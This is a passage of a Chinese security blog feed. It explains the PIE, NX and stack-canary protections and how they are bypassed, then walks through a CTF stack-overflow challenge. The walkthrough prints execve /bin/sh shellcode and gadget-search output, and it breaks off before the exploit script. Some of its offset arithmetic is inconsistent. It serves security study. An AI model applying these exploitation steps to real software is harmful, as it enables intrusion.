    <summary type="html">&lt;h1 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h1&gt;&lt;h3 id=&quot;打包、分发、部署&quot;&gt;&lt;a href=&quot;#打包、分发、部署&quot; class=&quot;headerlink&quot; title=&quot;打包、分发、部署&quot;&gt;&lt;/a&gt;打包、分发、部署&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;打包&lt;/strong&gt;：就是把你软件运行所需的依赖、第三方库、软件打包到一起，变成一个安装包&lt;br&gt;&lt;strong&gt;分发&lt;/strong&gt;：你可以把你打包好的“安装包”上传到一个镜像仓库，其他人可以非常方便的获取和安装&lt;br&gt;&lt;strong&gt;部署&lt;/strong&gt;：拿着“安装包”就可以一个命令运行起来你的应用，自动模拟出一摸一样的运行环境，不管是在 Windows&amp;#x2F;Mac&amp;#x2F;Linux。&lt;/p&gt;</summary>
    
    
    
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>PWN-shellcode</title>
    <link href="http://example.com/2025/06/03/PWN-shellcode/"/>
    <id>http://example.com/2025/06/03/PWN-shellcode/</id>
    <published>2025-06-03T11:56:27.000Z</published>
    <updated>2025-06-09T10:24:42.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-shellcode"><a href="#PWN-shellcode" class="headerlink" title="PWN-shellcode"></a>PWN-shellcode</h1><p>在开始之前呢首先我们先了解一下编译器开启的一些保护措施</p><h1 id="一、PIE"><a href="#一、PIE" class="headerlink" title="一、PIE"></a>一、PIE</h1><p><strong>PIE（Position Independent Executable）</strong> 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 <strong>ASLR（Address Space Layout Randomization）</strong> 进行地址空间的随机化，防止攻击者预测代码地址。</p><span id="more"></span><h3 id="什么是-PIE？"><a href="#什么是-PIE？" class="headerlink" title="什么是 PIE？"></a>什么是 PIE？</h3><p>PIE（Position Independent Executable，位置无关可执行文件）是一种编译方式，使得整个程序（包括代码段和数据段）都支持位置无关（Position Independent Code, PIC）。PIE 程序在加载时可以被映射到内存中的任意地址。</p><h3 id="为什么需要-PIE？"><a href="#为什么需要-PIE？" class="headerlink" title="为什么需要 PIE？"></a>为什么需要 PIE？</h3><p>PIE 是为了支持 <strong>ASLR</strong>。如果程序是固定地址加载，即使系统启用了 ASLR，也无法随机化主程序的加载地址，攻击者可以轻易定位到关键代码位置。</p><h3 id="PIE-和-PIC-的区别"><a href="#PIE-和-PIC-的区别" class="headerlink" title="PIE 和 PIC 的区别"></a>PIE 和 PIC 的区别</h3><table><thead><tr><th>特性</th><th>PIC</th><th>PIE</th></tr></thead><tbody><tr><td>应用</td><td>通常用于共享库（.so）</td><td>用于整个可执行文件</td></tr><tr><td>是否独立执行</td><td>否（依附主程序）</td><td>是（本身是一个独立程序）</td></tr><tr><td>支持ASLR</td><td>否（主程序不支持）</td><td>是（主程序支持）</td></tr></tbody></table><hr><h2 id="PIE-的工作原理"><a href="#PIE-的工作原理" class="headerlink" title="PIE 的工作原理"></a>PIE 的工作原理</h2><ol><li>PIE 编译时生成的是 <strong>位置无关代码</strong>（通过寄存器偏移访问全局数据、函数指针等），与共享库相似。</li><li>加载器可以将 PIE 可执行文件映射到随机的内存地址。</li><li>所有符号引用通过基址加偏移的方式计算地址，而非固定地址。</li></ol><hr><h2 id="如何启用和识别-PIE"><a href="#如何启用和识别-PIE" class="headerlink" title="如何启用和识别 PIE"></a>如何启用和识别 PIE</h2><p>编译启用 PIE</p><p>在使用 <code>gcc</code> 或 <code>clang</code> 时，加上以下参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIE -pie main.c -o main</span><br></pre></td></tr></table></figure><h2 id="PIE-的优点与缺点"><a href="#PIE-的优点与缺点" class="headerlink" title="PIE 的优点与缺点"></a>PIE 的优点与缺点</h2><p>优点：</p><ul><li>支持 ASLR，增强安全性，降低 Exploit 的可靠性。</li><li>防止 ROP（Return Oriented Programming）攻击中 gadget 地址的硬编码。</li></ul><p>缺点：</p><ul><li>运行时性能稍有下降（需要计算偏移地址）。</li><li>编译和链接略复杂（需要处理基地址偏移等问题）。</li><li>即使编译的时候开启了PIE而操作系统没有开启ASLR那么PIE是无效的 因为PIE是基于ASLR实现的</li></ul><h1 id="二、NX"><a href="#二、NX" class="headerlink" title="二、NX"></a>二、NX</h1><p><strong>NX保护（No eXecute &#x2F; 数据不可执行）</strong> 是现代操作系统中的一项关键内存安全保护机制，用于防止恶意代码执行。它主要通过标记内存页是否允许执行来阻止 <strong>缓冲区溢出</strong> 和 <strong>Shellcode 注入攻击</strong>。</p><hr><h2 id="什么是-NX-保护？"><a href="#什么是-NX-保护？" class="headerlink" title="什么是 NX 保护？"></a>什么是 NX 保护？</h2><p><strong>NX（No eXecute）</strong>，也叫 <strong>DEP（Data Execution Prevention）</strong>，是一种内存页访问权限控制技术。其核心思想是：</p><blockquote><p><strong>只允许代码段执行，禁止数据段执行。</strong></p></blockquote><p>攻击者常常通过缓冲区溢出将 Shellcode 注入堆栈、堆中，如果这些内存区域标记为不可执行，则注入的代码就无法被 CPU 执行，从而阻止了漏洞利用。</p><h2 id="在编译时启用-NX"><a href="#在编译时启用-NX" class="headerlink" title="在编译时启用 NX"></a>在编译时启用 NX</h2><p>通常，现代编译器默认会生成 NX 支持的可执行文件。如果你使用的是较老的系统或手动编译，建议添加以下编译器参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z noexecstack main.c -o main</span><br></pre></td></tr></table></figure><h2 id="三、绕过-NX-的常见方法（供防御者理解）"><a href="#三、绕过-NX-的常见方法（供防御者理解）" class="headerlink" title="三、绕过 NX 的常见方法（供防御者理解）"></a>三、绕过 NX 的常见方法（供防御者理解）</h2><p>虽然 NX 能阻止代码注入执行，但无法防止地址复用。攻击者常用以下技巧绕过 NX：</p><table><thead><tr><th>绕过方式</th><th>说明</th></tr></thead><tbody><tr><td><strong>ROP</strong>（Return Oriented Programming）</td><td>利用已有的代码片段（gadget）拼装攻击链</td></tr><tr><td><strong>ret2libc</strong></td><td>重定向控制流执行 libc 中的 <code>system(&quot;/bin/sh&quot;)</code></td></tr><tr><td><strong>JIT Spraying</strong></td><td>针对浏览器 JIT 编译器进行攻击，构造可执行段</td></tr><tr><td><strong>mprotect&#x2F;mmap 执行页改写</strong></td><td>利用已知函数改变页权限使数据可执行（需泄漏地址）</td></tr></tbody></table><p>因此，实际防护中应配合 ASLR、Stack Canary、RELRO 等机制一起使用。</p><h1 id="三、Canary-的工作机制"><a href="#三、Canary-的工作机制" class="headerlink" title="三、Canary 的工作机制"></a>三、Canary 的工作机制</h1><h3 id="栈帧布局改变（有-Canary-时）"><a href="#栈帧布局改变（有-Canary-时）" class="headerlink" title="栈帧布局改变（有 Canary 时）"></a>栈帧布局改变（有 Canary 时）</h3><p>以 x86 为例，函数栈帧布局：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sql复制编辑+---------------------+</span><br><span class="line">| 返回地址            | ← old EBP</span><br><span class="line">+---------------------+</span><br><span class="line">| Canary（金丝雀）    |</span><br><span class="line">+---------------------+</span><br><span class="line">| 局部变量/缓冲区等   |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><h3 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h3><ul><li><strong>函数调用时</strong>：编译器插入代码生成随机的 Canary 值并压入栈中。</li><li><strong>函数返回前</strong>：编译器插入代码检测栈上的 Canary 值是否被修改。</li><li><strong>若值被篡改</strong>：说明存在栈溢出攻击，程序触发 <code>__stack_chk_fail()</code>，<strong>立刻终止运行</strong>。</li></ul><hr><h2 id="Canary-的类型"><a href="#Canary-的类型" class="headerlink" title="Canary 的类型"></a>Canary 的类型</h2><p>GCC 实现中，常见的 Canary 类型有三种：</p><table><thead><tr><th>类型</th><th>特点</th></tr></thead><tbody><tr><td><strong>Terminator Canary</strong></td><td>包含不可打印字符（如 <code>0x00</code>、<code>0x0D</code>、<code>0x0A</code>），防止 <code>strcpy()</code> 等函数覆盖它</td></tr><tr><td><strong>Random Canary</strong></td><td>每次程序运行时随机生成，攻击者很难猜到其值</td></tr><tr><td><strong>TLS-based Canary</strong></td><td>每线程独立一个 Canary，提高多线程程序的安全性</td></tr></tbody></table><hr><h2 id="编译启用-Canary"><a href="#编译启用-Canary" class="headerlink" title="编译启用 Canary"></a>编译启用 Canary</h2><ol><li>GCC 编译选项</li></ol><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-fstack-protector</code></td><td>保护包含数组等变量的函数</td></tr><tr><td><code>-fstack-protector-strong</code></td><td>保护更多函数（推荐）</td></tr><tr><td><code>-fstack-protector-all</code></td><td>所有函数都启用 Canary</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector-strong -o main main.c</span><br></pre></td></tr></table></figure><h2 id="Canary-绕过难点与攻击方式"><a href="#Canary-绕过难点与攻击方式" class="headerlink" title="Canary 绕过难点与攻击方式"></a>Canary 绕过难点与攻击方式</h2><p>虽然 Canary 提高了安全性，但理论上不是绝对不可绕过的。常见绕过方式包括：</p><table><thead><tr><th>绕过方法</th><th>原理</th></tr></thead><tbody><tr><td><strong>信息泄露</strong></td><td>通过漏洞泄露 Canary 的值，再构造 Payload</td></tr><tr><td><strong>非溢出攻击</strong></td><td>使用 UAF、格式化字符串、Heap 攻击等绕过 Canary</td></tr><tr><td><strong>不破坏 Canary 的攻击</strong></td><td>比如 ROP，不需要覆盖返回地址或覆盖前先保留 Canary</td></tr><tr><td><strong>覆盖结构体指针</strong></td><td>Canary 只保护返回地址，不保护所有栈数据</td></tr></tbody></table><h2 id="Canary-的局限性"><a href="#Canary-的局限性" class="headerlink" title="Canary 的局限性"></a>Canary 的局限性</h2><table><thead><tr><th>局限点</th><th>描述</th></tr></thead><tbody><tr><td>只检测返回地址破坏</td><td>无法防止其他类型的数据破坏</td></tr><tr><td>信息泄露可被绕过</td><td>一旦泄漏 Canary 值，保护失效</td></tr><tr><td>性能影响（极小）</td><td>每个函数都多一次 Canary 检查（几乎忽略不计）</td></tr></tbody></table><h1 id="那么shellcode是什么？"><a href="#那么shellcode是什么？" class="headerlink" title="那么shellcode是什么？"></a>那么shellcode是什么？</h1><p>shellcode 其实就是一小段代码 可以用于软件漏洞利用的载荷 被称为 shellcode 是因为它通常启动一个命令终端 攻击者可以通过这个终端控制受害的计算机 但是所有执行类似任务的代码片段都可以称作shellcode Shellcode通常是以机器码形式编写的</p><p>在Pwntools中 内置了一些shellcode与编译方式 只需要使用以下方式就可以调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.amd64.sh())</span><br></pre></td></tr></table></figure><p>输出如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─[$]&gt; /usr/<span class="built_in">bin</span>/python3 /home/pwn/桌面/pwn/山化课程/day02-ret2shellcode/testshellcode.py</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>套用asm函数 就可以得到对应的shellcode 但是注意在调用前需要设置架构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.amd64.sh()))</span><br></pre></td></tr></table></figure><p>输出如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure><p>ret2shellcode 即控制程序执行shellcode代码 shellcode指的是用于完成某个功能的汇编代码 常见的功能主要是获取目标系统的shell</p><p>一般来说shellcode需要我们自已填充 这其实是另外一种典型的利用方法 即此时我们需要自已去填充一些可执行的代码 这种手法不需要程序内部具有system之类的函数 在最早的时候十分常见</p><p>在栈溢出的基础上 要想执行shellcode 需要对应的binary在运行时 shellcode所在的区域具有可执行权限</p><p><img src="/2025/06/03/PWN-shellcode/image-20250603203551082.png" alt="image-20250603203551082"></p><p>第一种利用方式</p><p>根据函数调用约定 在一个函数执行的最后是一个 leave ret </p><p>实质是</p><p>mov esp,ebp</p><p>pop ebp</p><p>pop eip</p><p>这时候我们在填充一个shellcode 然后控制返回地址为 <code>jmp esp</code> 即可利用</p><p><img src="/2025/06/03/PWN-shellcode/image-20250603203714001.png" alt="image-20250603203714001"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>使用checksec查保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=b0verfl0w</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">─[$]&gt; checksec --file=b0verfl0w</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   74 Symbols  No02b0verfl0w</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>未开启任何保护 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是函数的主函数 经过分析之后发现并没有 <code>bin/sh</code> 所以我们可以想到的是用shellcode 毕竟没有开启NX保护</p><p> 定位泄露位置可以通过ida计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000020</span>     <span class="type">char</span> s;</span><br><span class="line"><span class="number">-000000000000001F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001B</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>A     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000019</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000018</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000017</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000016</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000015</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000014</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000013</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000012</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000011</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000010</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000B</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>A     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000009</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000008</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000007</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000006</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000005</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000004</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000003</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000002</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000001</span>     <span class="comment">// padding byte</span></span><br><span class="line">+<span class="number">0000000000000000</span>     _DWORD __saved_registers;</span><br><span class="line">+<span class="number">0000000000000004</span>     _UNKNOWN *__return_address;</span><br></pre></td></tr></table></figure><p>s -&gt; return 是 0x20 + 4 &#x3D; 32+4 &#x3D; 36</p><p>但是呢 这道题比较特殊 因为他限制了输入的字符 <code>fgets(s, 50, stdin);</code></p><p>只能输入50个字符 但是pwntools生成的shellcode字符数过于庞大 且会被截断</p><p>所以我们要换个思路</p><p>首先 我们是否可以通过 ret的特性(<code>ret = jmp esp add esp,4</code>)来进行移植跳转呢 原理就是通过想栈上直接写shellcode 然后再通过 <code>jmp esp</code>的方式去跳转到shellcode的头呢</p><p>这样是可行的 我们开始构造 首先我们需要自已编写一个shellcode 如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; global _start</span><br><span class="line">; _start:</span><br><span class="line">; xor eax,eax  ;//eax置0</span><br><span class="line">; xor edx,edx  ;//edx置0</span><br><span class="line">; push edx</span><br><span class="line">; push sh</span><br><span class="line">; push bin   ;//将/bin/sh入栈</span><br><span class="line">; mov ebx,esp   ;//ebx指向/bin/sh这个字符串</span><br><span class="line">; xor ecx,ecx</span><br><span class="line">; mov al,0Bh    ;//eax置为execve函数的中断号</span><br><span class="line">; int 80h       ;//调用软中断</span><br><span class="line"></span><br><span class="line">; section .data</span><br><span class="line">; sh:db &#x27;/sh&#x27;</span><br><span class="line">;         bin:db &#x27;/bin&#x27;</span><br></pre></td></tr></table></figure><p>或者自已去shellcode网站下载一段shellcode</p><p>紧接着我们还得计算出这段shllcode的长度 因为我们要把剩下的字节给补成垃圾数据 </p><p>然后我们现在需要的就是一个 jmp esp的地址</p><p>之后我们就让 <code>ret</code> 处让他 <code>jmp_esp</code> 用 <code>ropper</code> 搜索即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day02-ret2shellcode$ ropper</span><br><span class="line">(ropper)&gt; file b0verfl0w</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="type">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line">[INFO] File loaded.</span><br><span class="line">(b0verfl0w/ELF/x86)&gt; jmp esp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JMP Instructions</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x08048504</span>: jmp esp; </span><br><span class="line"></span><br><span class="line"><span class="number">1</span> gadgets <span class="title function_">found</span></span><br><span class="line"><span class="params">(b0verfl0w/ELF/x86)</span>&gt; </span><br></pre></td></tr></table></figure><p>或者用<code>ROPgadget</code>搜索也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary b0verfl0w --only &quot;jmp&quot;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080483ab</span> : jmp <span class="number">0x8048390</span></span><br><span class="line"><span class="number">0x080484f2</span> : jmp <span class="number">0x8048470</span></span><br><span class="line"><span class="number">0x08048611</span> : jmp <span class="number">0x8048620</span></span><br><span class="line"><span class="number">0x0804855d</span> : jmp dword ptr [ecx + <span class="number">0x804a040</span>]</span><br><span class="line"><span class="number">0x08048550</span> : jmp dword ptr [ecx + <span class="number">0x804a060</span>]</span><br><span class="line"><span class="number">0x0804876f</span> : jmp dword ptr [ecx]</span><br><span class="line"><span class="number">0x08048504</span> : jmp esp</span><br></pre></td></tr></table></figure><p>0x08048504 就找到了我们的地址</p><p>跳转到 esp之后我们还得构造一个东西 那就是 让esp指向shellcode的头部 首先我们计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000020</span>     <span class="type">char</span> s;</span><br><span class="line"><span class="number">-000000000000001F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001B</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000001</span>A     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000019</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000018</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000017</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000016</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000015</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000014</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000013</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000012</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000011</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000010</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000B</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-000000000000000</span>A     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000009</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000008</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000007</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000006</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000005</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000004</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000003</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000002</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">-0000000000000001</span>     <span class="comment">// padding byte</span></span><br><span class="line">+<span class="number">0000000000000000</span>     _DWORD __saved_registers;</span><br><span class="line">+<span class="number">0000000000000004</span>     _UNKNOWN *__return_address;</span><br></pre></td></tr></table></figure><p>从 __return_address 到 s 是24个字节 但是我们中间还加了一个 <code>jmp esp</code> 这又占 四个字节 所以我们需要写成这样 <code>sub esp,0x28; jmp esp</code> 这样才对 之后我们的payload就构造完成了 脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 